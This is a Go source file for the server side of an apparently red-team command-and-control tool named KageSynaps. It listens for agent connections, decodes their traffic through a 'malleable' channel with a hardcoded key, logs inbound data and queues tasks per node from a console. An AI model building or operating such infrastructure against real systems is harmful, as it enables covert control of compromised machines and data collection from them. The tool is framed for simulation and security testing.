package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"KageSynaps/pkg/channel"
	"KageSynaps/pkg/logger"
)

var (
	activeNodes = make(map[string]time.Time)
	nodesMutex  sync.Mutex
	commandQueue = make(map[string]string)
	cmdMutex    sync.Mutex
)

func main() {
	fmt.Println("==============================================================")
	fmt.Println("  KAGESYNAPS v1.0.0 - C2 & Telemetry TeamServer              ")
	fmt.Println("  Developer: MrxdVibe                                         ")
	fmt.Println("==============================================================")

	jsonLog := logger.NewJSONLogger("logs/events.json")
	port := ":9090"
	listener, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Printf("[!] Failed to bind port %s: %v\n", port, err)
		return
	}
	defer listener.Close()

	fmt.Printf("[*] KageSynaps TeamServer Listening on 0.0.0.0%s...\n", port)

	dummyKey := []byte("0123456789abcdef0123456789abcdef")
	malleable := channel.NewMalleableChannel(dummyKey)

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			go handleAgent(conn, malleable, jsonLog)
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("KageSynaps(c2)> ")
		if !scanner.Scan() {
			break
		}
		cmd := strings.TrimSpace(scanner.Text())

		if cmd == "exit" {
			fmt.Println("[*] Shutting down TeamServer...")
			break
		} else if cmd == "nodes" {
			nodesMutex.Lock()
			fmt.Println("\n--- Active Nodes ---")
			for node, lastSeen := range activeNodes {
				fmt.Printf("Node ID: %s | Last Seen: %s\n", node, lastSeen.Format("15:04:05"))
			}
			fmt.Println("--------------------")
			nodesMutex.Unlock()
		} else if strings.HasPrefix(cmd, "exec ") {
			parts := strings.SplitN(cmd, " ", 3)
			if len(parts) < 3 {
				fmt.Println("[!] Usage: exec <node_id> <task_name>")
				continue
			}
			nodeID := parts[1]
			task := parts[2]

			cmdMutex.Lock()
			commandQueue[nodeID] = task
			cmdMutex.Unlock()

			fmt.Printf("[+] Queued task [%s] for Node [%s]\n", task, nodeID)
		} else if cmd == "help" {
			fmt.Println("Available Commands:")
			fmt.Println("  nodes                      - List connected nodes")
			fmt.Println("  exec <node_id> <task_name> - Queue a simulation task for a node")
			fmt.Println("  exit                       - Stop TeamServer")
		}
	}
}

func handleAgent(conn net.Conn, mc *channel.MalleableChannel, log *logger.JSONLogger) {
	defer conn.Close()
	buf := make([]byte, 4096)

	n, err := conn.Read(buf)
	if err != nil {
		return
	}

	packet, err := mc.UnpackPayload(buf[:n])
	if err != nil {
		return
	}

	nodesMutex.Lock()
	activeNodes[packet.AgentID] = time.Now()
	nodesMutex.Unlock()

	if len(packet.Payload) > 0 {
		fmt.Printf("\n[+] [TELEMETRY INBOUND] Node: %s\n    Payload: %s\nKageSynaps(c2)> ", packet.AgentID, string(packet.Payload))
		_ = log.WriteLog(packet.AgentID, string(packet.Payload))
	}

	cmdMutex.Lock()
	pendingCmd, exists := commandQueue[packet.AgentID]
	if exists {
		delete(commandQueue, packet.AgentID)
	}
	cmdMutex.Unlock()

	respCmd := ""
	if exists {
		respCmd = pendingCmd
	}

	responseBytes, _ := mc.PackPayload("SERVER", respCmd, nil)
	conn.Write(responseBytes)
}
